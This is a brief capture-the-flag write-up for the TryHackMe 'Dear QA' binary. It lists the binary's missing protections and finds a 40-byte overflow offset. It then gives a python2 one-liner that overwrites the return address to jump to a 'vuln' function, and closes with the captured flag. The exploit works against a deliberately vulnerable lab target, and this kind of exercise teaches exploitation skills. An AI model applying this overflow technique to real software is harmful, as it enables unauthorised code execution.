# Dear_QA 

> VOiD | Tuesday 08 February 2022 10:50:46 AM UTC

My IP : 
Target IP : 


## Checksec

```bash
checksec DearQA.DearQA 
[*] '/home/void/tryhackme/Dear_QA/DearQA.DearQA'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```

## pwngdb

```bash
0x0000000000400686  vuln 	"\x86\x06\x40\x00\x00\x00\x00\x00"
cyclic -l jaaa
36

eip at 40


python2 -c 'print "A" * 40 + "\x86\x06\x40\x00\x00\x00\x00\x00"' > payload

$ cat flag.txt
THM{PWN_1S_V3RY_E4SY}

```
